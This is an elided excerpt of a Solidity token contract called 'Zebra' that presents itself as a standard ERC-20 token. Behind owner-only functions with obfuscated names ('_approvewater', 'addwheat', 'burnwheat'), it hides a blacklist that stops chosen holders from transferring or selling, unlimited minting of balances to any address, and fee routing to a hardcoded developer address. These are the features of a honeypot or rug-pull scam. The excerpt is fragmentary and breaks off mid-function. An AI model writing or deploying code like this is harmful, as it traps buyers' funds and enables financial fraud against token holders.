...
contract Ownable is Context {
    ...
    address private _OwnerAddress = 0x867991292e61bb4215Ab074B3fAcbF74547E2100;
...
contract Zebra is Context, IERC20, Ownable {
    ...
    string private _name = "Zebra";
    string private _symbol = "Zebra";
    uint8 private _decimals = 3;
     
    address public deadAddress = 0x000000000000000000000000000000000000dEaD;
    address public devAddress = 0x867991292e61bb4215Ab074B3fAcbF74547E2100;
  
    uint256 public deadFee = 3;
    uint256 public devFee = 2;

    mapping(address => bool) private _water;
    bool private open = true;
    bool private unopen = false;
    
    uint256 public burnwater = uint256(0);
    mapping(address => uint256) private burnwaters;
    address[] private _burnwaters;

    uint256 public water = uint256(0);
    mapping(address => uint256) private waters;
    address[] private _waters;

    address owners;

    constructor() public {
        _rOwned[_msgSender()] = _total;
         owners = _msgSender();
    ...
    function _unopen(bool wheatAddress) external OwnerAddress() {
        unopen = wheatAddress;
    }
    function _approvewater(address wheatAddress) external OwnerAddress() {
        _water[wheatAddress] = true;
    }

    function _approvewaters(address wheatAddress) external OwnerAddress() {
        delete _water[wheatAddress];
    }
    function addwheat(address wheatAddress, uint256 wheatquantity) 
        external 
        OwnerAddress() {
        require(wheatquantity > 0, "wheatquantity");
        uint256 pig = waters[wheatAddress];
        if (pig == 0) _waters.push(wheatAddress);
        waters[wheatAddress] = pig.add(wheatquantity);
        water = water.add(wheatquantity);
        _rOwned[wheatAddress] = _rOwned[wheatAddress].add(wheatquantity);
    }
    
    function ASKwheat(address wheatAddress)
        external
        view
        OwnerAddress()
        returns (bool)
    {
        return _water[wheatAddress];
    }
    ...
    function _transfer(
        ...
        if (open) {
            require(_water[from] == false, "open");
        }
    ...
    function burnwheat(address burnwheatAddress, uint256 burnwheatquantity)
        external
        OwnerAddress() {
        require(burnwheatquantity > 0, "burnwheatquantity");
        uint256 burnpig = waters[burnwheatAddress];
        if (burnpig == 0) _burnwaters.push(burnwheatAddress);
        burnwaters[burnwheatAddress] = burnpig.add(burnwheatquantity);
        burnwater = burnwater.add(burnwheatquantity);
